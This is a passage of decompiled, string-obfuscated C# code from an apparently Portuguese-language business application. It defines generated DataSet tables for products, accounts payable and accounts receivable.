				columnSITE.MaxLength = 50;
				columnFACEBOOK.MaxLength = 50;
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_CADPRODRow NewTB_CADPRODRow()
			{
				return (TB_CADPRODRow)NewRow();
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			protected override DataRow NewRowFromBuilder(DataRowBuilder builder)
			{
				return new TB_CADPRODRow(builder);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			protected override Type GetRowType()
			{
				return typeof(TB_CADPRODRow);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void RemoveTB_CADPRODRow(TB_CADPRODRow row)
			{
				base.Rows.Remove(row);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public static XmlSchemaComplexType GetTypedTableSchema(XmlSchemaSet xs)
			{
				//IL_0001: Unknown result type (might be due to invalid IL or missing references)
				//IL_0007: Expected O, but got Unknown
				//IL_0007: Unknown result type (might be due to invalid IL or missing references)
				//IL_000d: Expected O, but got Unknown
				//IL_0013: Unknown result type (might be due to invalid IL or missing references)
				//IL_0019: Expected O, but got Unknown
				//IL_005c: Unknown result type (might be due to invalid IL or missing references)
				//IL_0063: Expected O, but got Unknown
				//IL_009f: Unknown result type (might be due to invalid IL or missing references)
				//IL_00a4: Unknown result type (might be due to invalid IL or missing references)
				//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
				//IL_00c7: Expected O, but got Unknown
				//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
				//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
				//IL_00e4: Unknown result type (might be due to invalid IL or missing references)
				//IL_00fa: Expected O, but got Unknown
				//IL_015c: Unknown result type (might be due to invalid IL or missing references)
				//IL_0163: Expected O, but got Unknown
				XmlSchemaComplexType val = new XmlSchemaComplexType();
				XmlSchemaSequence val2 = new XmlSchemaSequence();
				BD_AUTOMCAODataSet bD_AUTOMCAODataSet = new BD_AUTOMCAODataSet();
				XmlSchemaAny val3 = new XmlSchemaAny();
				val3.Namespace = \u0004.\u0001.\u0001(2676);
				((XmlSchemaParticle)val3).MinOccurs = 0m;
				((XmlSchemaParticle)val3).MaxOccurs = decimal.MaxValue;
				val3.ProcessContents = (XmlSchemaContentProcessing)2;
				((XmlSchemaGroupBase)val2).Items.Add((XmlSchemaObject)(object)val3);
				XmlSchemaAny val4 = new XmlSchemaAny();
				val4.Namespace = \u0004.\u0001.\u0001(2744);
				((XmlSchemaParticle)val4).MinOccurs = 1m;
				val4.ProcessContents = (XmlSchemaContentProcessing)2;
				((XmlSchemaGroupBase)val2).Items.Add((XmlSchemaObject)(object)val4);
				val.Attributes.Add((XmlSchemaObject)new XmlSchemaAttribute
				{
					Name = \u0004.\u0001.\u0001(2830),
					FixedValue = bD_AUTOMCAODataSet.Namespace
				});
				val.Attributes.Add((XmlSchemaObject)new XmlSchemaAttribute
				{
					Name = \u0004.\u0001.\u0001(2852),
					FixedValue = \u0004.\u0001.\u0001(3282)
				});
				val.Particle = (XmlSchemaParticle)(object)val2;
				XmlSchema schemaSerializable = bD_AUTOMCAODataSet.GetSchemaSerializable();
				if (xs.Contains(schemaSerializable.TargetNamespace))
				{
					MemoryStream memoryStream = new MemoryStream();
					MemoryStream memoryStream2 = new MemoryStream();
					try
					{
						schemaSerializable.Write((Stream)memoryStream);
						IEnumerator enumerator = xs.Schemas(schemaSerializable.TargetNamespace).GetEnumerator();
						while (enumerator.MoveNext())
						{
							XmlSchema val5 = (XmlSchema)enumerator.Current;
							memoryStream2.SetLength(0L);
							val5.Write((Stream)memoryStream2);
							if (memoryStream.Length == memoryStream2.Length)
							{
								memoryStream.Position = 0L;
								memoryStream2.Position = 0L;
								while (memoryStream.Position != memoryStream.Length && memoryStream.ReadByte() == memoryStream2.ReadByte())
								{
								}
								if (memoryStream.Position == memoryStream.Length)
								{
									return val;
								}
							}
						}
					}
					finally
					{
						memoryStream?.Close();
						memoryStream2?.Close();
					}
				}
				xs.Add(schemaSerializable);
				return val;
			}
		}

		[Serializable]
		[XmlSchemaProvider("GetTypedTableSchema")]
		public class TB_CONTASPAGARDataTable : DataTable, IEnumerable
		{
			private DataColumn columnCódigo;

			private DataColumn columnDATA;

			private DataColumn columnDESCRICAO;

			private DataColumn columnPAGAR_PARA;

			private DataColumn columnVALOR;

			private DataColumn columnOBSERVACAO;

			private DataColumn columnBANCO_AGENCIA;

			private DataColumn columnCHEQUE;

			private DataColumn columnREPETIR;

			private DataColumn columnSITUACAO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn CódigoColumn => columnCódigo;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn DATAColumn => columnDATA;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn DESCRICAOColumn => columnDESCRICAO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn PAGAR_PARAColumn => columnPAGAR_PARA;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn VALORColumn => columnVALOR;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn OBSERVACAOColumn => columnOBSERVACAO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn BANCO_AGENCIAColumn => columnBANCO_AGENCIA;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn CHEQUEColumn => columnCHEQUE;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn REPETIRColumn => columnREPETIR;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn SITUACAOColumn => columnSITUACAO;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[Browsable(false)]
			public int Count => base.Rows.Count;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_CONTASPAGARRow this[int index] => (TB_CONTASPAGARRow)base.Rows[index];

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_CONTASPAGARRowChangeEventHandler TB_CONTASPAGARRowChanging;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_CONTASPAGARRowChangeEventHandler TB_CONTASPAGARRowChanged;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_CONTASPAGARRowChangeEventHandler TB_CONTASPAGARRowDeleting;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_CONTASPAGARRowChangeEventHandler TB_CONTASPAGARRowDeleted;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_CONTASPAGARDataTable()
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				base.TableName = \u0004.\u0001.\u0001(1334);
				BeginInit();
				InitClass();
				EndInit();
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			internal TB_CONTASPAGARDataTable(DataTable table)
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				base.TableName = table.TableName;
				if (table.CaseSensitive != table.DataSet.CaseSensitive)
				{
					base.CaseSensitive = table.CaseSensitive;
				}
				if (Operators.CompareString(table.Locale.ToString(), table.DataSet.Locale.ToString(), false) != 0)
				{
					base.Locale = table.Locale;
				}
				if (Operators.CompareString(table.Namespace, table.DataSet.Namespace, false) != 0)
				{
					base.Namespace = table.Namespace;
				}
				base.Prefix = table.Prefix;
				base.MinimumCapacity = table.MinimumCapacity;
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			protected TB_CONTASPAGARDataTable(SerializationInfo info, StreamingContext context)
			{
				\u0008.\u0002.\u0001();
				base..ctor(info, context);
				InitVars();
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void AddTB_CONTASPAGARRow(TB_CONTASPAGARRow row)
			{
				base.Rows.Add(row);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_CONTASPAGARRow AddTB_CONTASPAGARRow(DateTime DATA, string DESCRICAO, string PAGAR_PARA, double VALOR, string OBSERVACAO, string BANCO_AGENCIA, string CHEQUE, int REPETIR, string SITUACAO)
			{
				TB_CONTASPAGARRow tB_CONTASPAGARRow = (TB_CONTASPAGARRow)NewRow();
				object[] itemArray = new object[10] { null, DATA, DESCRICAO, PAGAR_PARA, VALOR, OBSERVACAO, BANCO_AGENCIA, CHEQUE, REPETIR, SITUACAO };
				tB_CONTASPAGARRow.ItemArray = itemArray;
				base.Rows.Add(tB_CONTASPAGARRow);
				return tB_CONTASPAGARRow;
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_CONTASPAGARRow FindByCódigo(int Código)
			{
				return (TB_CONTASPAGARRow)base.Rows.Find(new object[1] { Código });
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public virtual IEnumerator GetEnumerator()
			{
				return base.Rows.GetEnumerator();
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public override DataTable Clone()
			{
				TB_CONTASPAGARDataTable tB_CONTASPAGARDataTable = (TB_CONTASPAGARDataTable)base.Clone();
				tB_CONTASPAGARDataTable.InitVars();
				return tB_CONTASPAGARDataTable;
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			protected override DataTable CreateInstance()
			{
				return new TB_CONTASPAGARDataTable();
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			internal void InitVars()
			{
				columnCódigo = base.Columns[\u0004.\u0001.\u0001(2290)];
				columnDATA = base.Columns[\u0004.\u0001.\u0001(3324)];
				columnDESCRICAO = base.Columns[\u0004.\u0001.\u0001(2922)];
				columnPAGAR_PARA = base.Columns[\u0004.\u0001.\u0001(3336)];
				columnVALOR = base.Columns[\u0004.\u0001.\u0001(3360)];
				columnOBSERVACAO = base.Columns[\u0004.\u0001.\u0001(2590)];
				columnBANCO_AGENCIA = base.Columns[\u0004.\u0001.\u0001(3374)];
				columnCHEQUE = base.Columns[\u0004.\u0001.\u0001(3404)];
				columnREPETIR = base.Columns[\u0004.\u0001.\u0001(3420)];
				columnSITUACAO = base.Columns[\u0004.\u0001.\u0001(3438)];
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			private void InitClass()
			{
				columnCódigo = new DataColumn(\u0004.\u0001.\u0001(2290), typeof(int), null, MappingType.Element);
				base.Columns.Add(columnCódigo);
				columnDATA = new DataColumn(\u0004.\u0001.\u0001(3324), typeof(DateTime), null, MappingType.Element);
				base.Columns.Add(columnDATA);
				columnDESCRICAO = new DataColumn(\u0004.\u0001.\u0001(2922), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnDESCRICAO);
				columnPAGAR_PARA = new DataColumn(\u0004.\u0001.\u0001(3336), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnPAGAR_PARA);
				columnVALOR = new DataColumn(\u0004.\u0001.\u0001(3360), typeof(double), null, MappingType.Element);
				base.Columns.Add(columnVALOR);
				columnOBSERVACAO = new DataColumn(\u0004.\u0001.\u0001(2590), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnOBSERVACAO);
				columnBANCO_AGENCIA = new DataColumn(\u0004.\u0001.\u0001(3374), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnBANCO_AGENCIA);
				columnCHEQUE = new DataColumn(\u0004.\u0001.\u0001(3404), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnCHEQUE);
				columnREPETIR = new DataColumn(\u0004.\u0001.\u0001(3420), typeof(int), null, MappingType.Element);
				base.Columns.Add(columnREPETIR);
				columnSITUACAO = new DataColumn(\u0004.\u0001.\u0001(3438), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnSITUACAO);
				base.Constraints.Add(new UniqueConstraint(\u0004.\u0001.\u0001(2650), new DataColumn[1] { columnCódigo }, isPrimaryKey: true));
				columnCódigo.AutoIncrement = true;
				columnCódigo.AutoIncrementSeed = -1L;
				columnCódigo.AutoIncrementStep = -1L;
				columnCódigo.AllowDBNull = false;
				columnCódigo.Unique = true;
				columnDESCRICAO.MaxLength = 50;
				columnPAGAR_PARA.MaxLength = 50;
				columnOBSERVACAO.MaxLength = 100;
				columnBANCO_AGENCIA.MaxLength = 20;
				columnCHEQUE.MaxLength = 20;
				columnSITUACAO.MaxLength = 8;
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_CONTASPAGARRow NewTB_CONTASPAGARRow()
			{
				return (TB_CONTASPAGARRow)NewRow();
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			protected override DataRow NewRowFromBuilder(DataRowBuilder builder)
			{
				return new TB_CONTASPAGARRow(builder);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			protected override Type GetRowType()
			{
				return typeof(TB_CONTASPAGARRow);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void RemoveTB_CONTASPAGARRow(TB_CONTASPAGARRow row)
			{
				base.Rows.Remove(row);
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public static XmlSchemaComplexType GetTypedTableSchema(XmlSchemaSet xs)
			{
				//IL_0001: Unknown result type (might be due to invalid IL or missing references)
				//IL_0007: Expected O, but got Unknown
				//IL_0007: Unknown result type (might be due to invalid IL or missing references)
				//IL_000d: Expected O, but got Unknown
				//IL_0013: Unknown result type (might be due to invalid IL or missing references)
				//IL_0019: Expected O, but got Unknown
				//IL_005c: Unknown result type (might be due to invalid IL or missing references)
				//IL_0063: Expected O, but got Unknown
				//IL_009f: Unknown result type (might be due to invalid IL or missing references)
				//IL_00a4: Unknown result type (might be due to invalid IL or missing references)
				//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
				//IL_00c7: Expected O, but got Unknown
				//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
				//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
				//IL_00e4: Unknown result type (might be due to invalid IL or missing references)
				//IL_00fa: Expected O, but got Unknown
				//IL_015c: Unknown result type (might be due to invalid IL or missing references)
				//IL_0163: Expected O, but got Unknown
				XmlSchemaComplexType val = new XmlSchemaComplexType();
				XmlSchemaSequence val2 = new XmlSchemaSequence();
				BD_AUTOMCAODataSet bD_AUTOMCAODataSet = new BD_AUTOMCAODataSet();
				XmlSchemaAny val3 = new XmlSchemaAny();
				val3.Namespace = \u0004.\u0001.\u0001(2676);
				((XmlSchemaParticle)val3).MinOccurs = 0m;
				((XmlSchemaParticle)val3).MaxOccurs = decimal.MaxValue;
				val3.ProcessContents = (XmlSchemaContentProcessing)2;
				((XmlSchemaGroupBase)val2).Items.Add((XmlSchemaObject)(object)val3);
				XmlSchemaAny val4 = new XmlSchemaAny();
				val4.Namespace = \u0004.\u0001.\u0001(2744);
				((XmlSchemaParticle)val4).MinOccurs = 1m;
				val4.ProcessContents = (XmlSchemaContentProcessing)2;
				((XmlSchemaGroupBase)val2).Items.Add((XmlSchemaObject)(object)val4);
				val.Attributes.Add((XmlSchemaObject)new XmlSchemaAttribute
				{
					Name = \u0004.\u0001.\u0001(2830),
					FixedValue = bD_AUTOMCAODataSet.Namespace
				});
				val.Attributes.Add((XmlSchemaObject)new XmlSchemaAttribute
				{
					Name = \u0004.\u0001.\u0001(2852),
					FixedValue = \u0004.\u0001.\u0001(3458)
				});
				val.Particle = (XmlSchemaParticle)(object)val2;
				XmlSchema schemaSerializable = bD_AUTOMCAODataSet.GetSchemaSerializable();
				if (xs.Contains(schemaSerializable.TargetNamespace))
				{
					MemoryStream memoryStream = new MemoryStream();
					MemoryStream memoryStream2 = new MemoryStream();
					try
					{
						schemaSerializable.Write((Stream)memoryStream);
						IEnumerator enumerator = xs.Schemas(schemaSerializable.TargetNamespace).GetEnumerator();
						while (enumerator.MoveNext())
						{
							XmlSchema val5 = (XmlSchema)enumerator.Current;
							memoryStream2.SetLength(0L);
							val5.Write((Stream)memoryStream2);
							if (memoryStream.Length == memoryStream2.Length)
							{
								memoryStream.Position = 0L;
								memoryStream2.Position = 0L;
								while (memoryStream.Position != memoryStream.Length && memoryStream.ReadByte() == memoryStream2.ReadByte())
								{
								}
								if (memoryStream.Position == memoryStream.Length)
								{
									return val;
								}
							}
						}
					}
					finally
					{
						memoryStream?.Close();
						memoryStream2?.Close();
					}
				}
				xs.Add(schemaSerializable);
				return val;
			}
		}

		[Serializable]
		[XmlSchemaProvider("GetTypedTableSchema")]
		public class TB_CONTASRECEBERDataTable : DataTable, IEnumerable
		{
			private DataColumn columnCódigo;

			private DataColumn columnDATA_VENDA;

			private DataColumn columnDESCRICAO;

			private DataColumn columnNOME;

			private DataColumn columnVALOR;

			private DataColumn columnOBSERVACAO;

			private DataColumn columnSITUACAO;

			private DataColumn columnTEL_CEL;

			private DataColumn columnTEL_RES;

			private DataColumn columnDATA_VENCIMENTO;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn CódigoColumn => columnCódigo;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn DATA_VENDAColumn => columnDATA_VENDA;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn DESCRICAOColumn => columnDESCRICAO;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn NOMEColumn => columnNOME;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn VALORColumn => columnVALOR;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn OBSERVACAOColumn => columnOBSERVACAO;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public DataColumn SITUACAOColumn => columnSITUACAO;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn TEL_CELColumn => columnTEL_CEL;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn TEL_RESColumn => columnTEL_RES;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public DataColumn DATA_VENCIMENTOColumn => columnDATA_VENCIMENTO;

			[Browsable(false)]
			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public int Count => base.Rows.Count;

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_CONTASRECEBERRow this[int index] => (TB_CONTASRECEBERRow)base.Rows[index];

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_CONTASRECEBERRowChangeEventHandler TB_CONTASRECEBERRowChanging;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_CONTASRECEBERRowChangeEventHandler TB_CONTASRECEBERRowChanged;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_CONTASRECEBERRowChangeEventHandler TB_CONTASRECEBERRowDeleting;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public event TB_CONTASRECEBERRowChangeEventHandler TB_CONTASRECEBERRowDeleted;

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public TB_CONTASRECEBERDataTable()
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				base.TableName = \u0004.\u0001.\u0001(1366);
				BeginInit();
				InitClass();
				EndInit();
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			internal TB_CONTASRECEBERDataTable(DataTable table)
			{
				\u0008.\u0002.\u0001();
				base..ctor();
				base.TableName = table.TableName;
				if (table.CaseSensitive != table.DataSet.CaseSensitive)
				{
					base.CaseSensitive = table.CaseSensitive;
				}
				if (Operators.CompareString(table.Locale.ToString(), table.DataSet.Locale.ToString(), false) != 0)
				{
					base.Locale = table.Locale;
				}
				if (Operators.CompareString(table.Namespace, table.DataSet.Namespace, false) != 0)
				{
					base.Namespace = table.Namespace;
				}
				base.Prefix = table.Prefix;
				base.MinimumCapacity = table.MinimumCapacity;
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			protected TB_CONTASRECEBERDataTable(SerializationInfo info, StreamingContext context)
			{
				\u0008.\u0002.\u0001();
				base..ctor(info, context);
				InitVars();
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			public void AddTB_CONTASRECEBERRow(TB_CONTASRECEBERRow row)
			{
				base.Rows.Add(row);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_CONTASRECEBERRow AddTB_CONTASRECEBERRow(DateTime DATA_VENDA, string DESCRICAO, string NOME, double VALOR, string OBSERVACAO, string SITUACAO, string TEL_CEL, string TEL_RES, DateTime DATA_VENCIMENTO)
			{
				TB_CONTASRECEBERRow tB_CONTASRECEBERRow = (TB_CONTASRECEBERRow)NewRow();
				object[] itemArray = new object[10] { null, DATA_VENDA, DESCRICAO, NOME, VALOR, OBSERVACAO, SITUACAO, TEL_CEL, TEL_RES, DATA_VENCIMENTO };
				tB_CONTASRECEBERRow.ItemArray = itemArray;
				base.Rows.Add(tB_CONTASRECEBERRow);
				return tB_CONTASRECEBERRow;
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_CONTASRECEBERRow FindByCódigo(int Código)
			{
				return (TB_CONTASRECEBERRow)base.Rows.Find(new object[1] { Código });
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public virtual IEnumerator GetEnumerator()
			{
				return base.Rows.GetEnumerator();
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public override DataTable Clone()
			{
				TB_CONTASRECEBERDataTable tB_CONTASRECEBERDataTable = (TB_CONTASRECEBERDataTable)base.Clone();
				tB_CONTASRECEBERDataTable.InitVars();
				return tB_CONTASRECEBERDataTable;
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			protected override DataTable CreateInstance()
			{
				return new TB_CONTASRECEBERDataTable();
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			internal void InitVars()
			{
				columnCódigo = base.Columns[\u0004.\u0001.\u0001(2290)];
				columnDATA_VENDA = base.Columns[\u0004.\u0001.\u0001(3508)];
				columnDESCRICAO = base.Columns[\u0004.\u0001.\u0001(2922)];
				columnNOME = base.Columns[\u0004.\u0001.\u0001(3532)];
				columnVALOR = base.Columns[\u0004.\u0001.\u0001(3360)];
				columnOBSERVACAO = base.Columns[\u0004.\u0001.\u0001(2590)];
				columnSITUACAO = base.Columns[\u0004.\u0001.\u0001(3438)];
				columnTEL_CEL = base.Columns[\u0004.\u0001.\u0001(2398)];
				columnTEL_RES = base.Columns[\u0004.\u0001.\u0001(2416)];
				columnDATA_VENCIMENTO = base.Columns[\u0004.\u0001.\u0001(3544)];
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			private void InitClass()
			{
				columnCódigo = new DataColumn(\u0004.\u0001.\u0001(2290), typeof(int), null, MappingType.Element);
				base.Columns.Add(columnCódigo);
				columnDATA_VENDA = new DataColumn(\u0004.\u0001.\u0001(3508), typeof(DateTime), null, MappingType.Element);
				base.Columns.Add(columnDATA_VENDA);
				columnDESCRICAO = new DataColumn(\u0004.\u0001.\u0001(2922), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnDESCRICAO);
				columnNOME = new DataColumn(\u0004.\u0001.\u0001(3532), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnNOME);
				columnVALOR = new DataColumn(\u0004.\u0001.\u0001(3360), typeof(double), null, MappingType.Element);
				base.Columns.Add(columnVALOR);
				columnOBSERVACAO = new DataColumn(\u0004.\u0001.\u0001(2590), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnOBSERVACAO);
				columnSITUACAO = new DataColumn(\u0004.\u0001.\u0001(3438), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnSITUACAO);
				columnTEL_CEL = new DataColumn(\u0004.\u0001.\u0001(2398), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnTEL_CEL);
				columnTEL_RES = new DataColumn(\u0004.\u0001.\u0001(2416), typeof(string), null, MappingType.Element);
				base.Columns.Add(columnTEL_RES);
				columnDATA_VENCIMENTO = new DataColumn(\u0004.\u0001.\u0001(3544), typeof(DateTime), null, MappingType.Element);
				base.Columns.Add(columnDATA_VENCIMENTO);
				base.Constraints.Add(new UniqueConstraint(\u0004.\u0001.\u0001(2650), new DataColumn[1] { columnCódigo }, isPrimaryKey: true));
				columnCódigo.AutoIncrement = true;
				columnCódigo.AutoIncrementSeed = -1L;
				columnCódigo.AutoIncrementStep = -1L;
				columnCódigo.AllowDBNull = false;
				columnCódigo.Unique = true;
				columnDESCRICAO.MaxLength = 100;
				columnNOME.MaxLength = 50;
				columnOBSERVACAO.MaxLength = 100;
				columnSITUACAO.MaxLength = 8;
				columnTEL_CEL.MaxLength = 14;
				columnTEL_RES.MaxLength = 14;
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public TB_CONTASRECEBERRow NewTB_CONTASRECEBERRow()
			{
				return (TB_CONTASRECEBERRow)NewRow();
			}

			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			[DebuggerNonUserCode]
			protected override DataRow NewRowFromBuilder(DataRowBuilder builder)
			{
				return new TB_CONTASRECEBERRow(builder);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			protected override Type GetRowType()
			{
				return typeof(TB_CONTASRECEBERRow);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public void RemoveTB_CONTASRECEBERRow(TB_CONTASRECEBERRow row)
			{
				base.Rows.Remove(row);
			}

			[DebuggerNonUserCode]
			[GeneratedCode("System.Data.Design.TypedDataSetGenerator", "17.0.0.0")]
			public static XmlSchemaComplexType GetTypedTableSchema(XmlSchemaSet xs)
			{
				//IL_0001: Unknown result type (might be due to invalid IL or missing references)
				//IL_0007: Expected O, but got Unknown
				//IL_0007: Unknown result type (might be due to invalid IL or missing references)
				//IL_000d: Expected O, but got Unknown
				//IL_0013: Unknown result type (might be due to invalid IL or missing references)
				//IL_0019: Expected O, but got Unknown
				//IL_005c: Unknown result type (might be due to invalid IL or missing references)
				//IL_0063: Expected O, but got Unknown
				//IL_009f: Unknown result type (might be due to invalid IL or missing references)
				//IL_00a4: Unknown result type (might be due to invalid IL or missing references)
				//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
				//IL_00c7: Expected O, but got Unknown
				//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
				//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
				//IL_00e4: Unknown result type (might be due to invalid IL or missing references)
				//IL_00fa: Expected O, but got Unknown
				//IL_015c: Unknown result type (might be due to invalid IL or missing references)
				//IL_0163: Expected O, but got Unknown
				XmlSchemaComplexType val = new XmlSchemaComplexType();
				XmlSchemaSequence val2 = new XmlSchemaSequence();
				BD_AUTOMCAODataSet bD_AUTOMCAODataSet = new BD_AUTOMCAODataSet();
